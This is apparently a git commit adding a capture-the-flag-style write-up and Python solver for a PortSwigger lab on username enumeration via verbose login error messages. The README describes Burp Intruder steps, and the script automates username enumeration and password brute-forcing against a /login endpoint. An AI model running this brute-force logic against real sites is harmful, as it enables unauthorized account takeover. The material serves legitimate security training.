a960e493b90b36f48bcb000119579b2a0aa41cbf
Frank Leitner <gitlab@frank-leitner.de>
2021-09-13 19:33:08 +0200

    Add Lab: Username enumeration via different responses

---
+++ authentication/Username_enumeration_via_different_responses/README.md
@@ -0,0 +1,55 @@
+# Lab: Username enumeration via different responses
+
+Lab-Link: <https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses>  
+Difficulty: APPRENTICE  
+Python script: [script.py](script.py)  
+
+## Known information
+
+- Login mechanism vulnerable to brute force
+- Detailed responses about cause of error
+- Lists of possible usernames and passwords are provided
+- Goals:
+  - enumerate a valid user
+  - brute force the corresponding password
+  - login and access account page
+
+## Enumerate username
+
+As a first step, go to the page and try to login with some random username and password. Notice that the response is rather telling about the error reason:
+
+![Verbose error message invalid username](img/invalid_username.png)
+
+Such behaviour is rather rare nowadays but shows nicely the reason behind the generic 'login failed' messages of today.
+
+Load the page in Burp Intruder, with the username as only payload
+
+![Burp Intruder payload position](img/intruder_positions.png)
+
+Attack type: *Sniper*
+Payload: *provided username list*
+
+After running the enumeration, we need to find the valid usernames. The page shows `invalid username` if the user is not found, so use a negative filter for this:
+
+![Verbose error message incorrect password](img/invalid_password.png)
+
+Username found: **announcements**
+
+### Brute force password
+
+In the screenshot above we clearly see another very verbose error message, so we basically repeat the step, using the username found as username and brute forcing the password argument with the provided password list.
+
+![Burp Intruder payload position password](img/intruder_password_position.png)
+
+Attack type: *Sniper*
+Payload: *provided password list*
+
+![Burp Intruder password found](img/password_found.png)
+
+The result filter now uses the `Incorrect password` message to show just the correct password. The page is a redirect to the `/my-account` page that is goal of the lab.
+
+### Login
+
+Login with the username and password combination, or simply use Burps 'Request in browser' feature to avoid typing results in:
+
+![success](img/success.png)
---
+++ authentication/Username_enumeration_via_different_responses/script.py
@@ -0,0 +1,93 @@
+#!/usr/bin/env python3
+# Lab: Username enumeration via different responses
+# Lab-Link: <https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses>
+# Difficulty: APPRENTICE
+import requests
+import sys
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+
+def login(url, username, password):
+    """Atempt to login.
+    Return values:
+      False On any condition not mentioned below
+      1 if response contains string 'Invalid username' 
+      2 if response contains string 'Incorrect password'
+      3 if response is a redirect
+    """
+    data = {'username': username, 'password': password}
+    r = requests.post(url, data=data, allow_redirects=False, verify=False, proxies=proxies)
+
+    if r.status_code == 302:
+        return 3
+
+    res = r.text
+    if 'Invalid username' in res:
+        return 1
+
+    if 'Incorrect password' in res:
+        return 2
+
+    return False
+
+
+def enumerate_username(url, username_filename):
+    with open(username_filename, 'r') as infile:
+        for line in infile:
+            username = line.rstrip()
+            if login(url, username, 'XXX') == 2:
+                return username
+
+    return False
+
+
+def enumerate_password(url, username, passwords_filename):
+    with open(passwords_filename, 'r') as infile:
+        for line in infile:
+            password = line.rstrip()
+            if login(url, username, password) == 3:
+                return password
+    return False
+
+
+def verify_login(url, username, password):
+    data = {'username': username, 'password': password}
+    r = requests.post(url, data=data, verify=False, proxies=proxies)
+    if 'Congratulations, you solved the lab!' in r.text:
+        return True
+    return False
+
+
+def main():
+    try:
+        host = sys.argv[1].strip().rstrip('/')
+    except IndexError:
+        print(f'Usage: {sys.argv[0]} <HOST>')
+        print(f'Exampe: {sys.argv[0]} http://www.example.com')
+        sys.exit(-1)
+
+    print(f'[ ] Brute force username and password')
+
+    url = f'{host}/login'
+    username = enumerate_username(f'{url}', '../candidate_usernames.txt')
+    if not username:
+        print(f'[-] Failed to enumerate username')
+        sys.exit(-2)
+    print(f'[+] Found username: {username}')
+
+    password = enumerate_password(f'{url}', username, '../candidate_passwords.txt')
+    if not password:
+        print(f'[-] Failed to enumerate password')
+        sys.exit(-3)
+    print(f'[+] Found password: {password}')
+
+    if verify_login(url, username, password):
+        print(f'[+] Login successful, lab solved')
+    else:
+        print(f'[+] Login not successful')
+
+
+if __name__ == "__main__":
+    main()
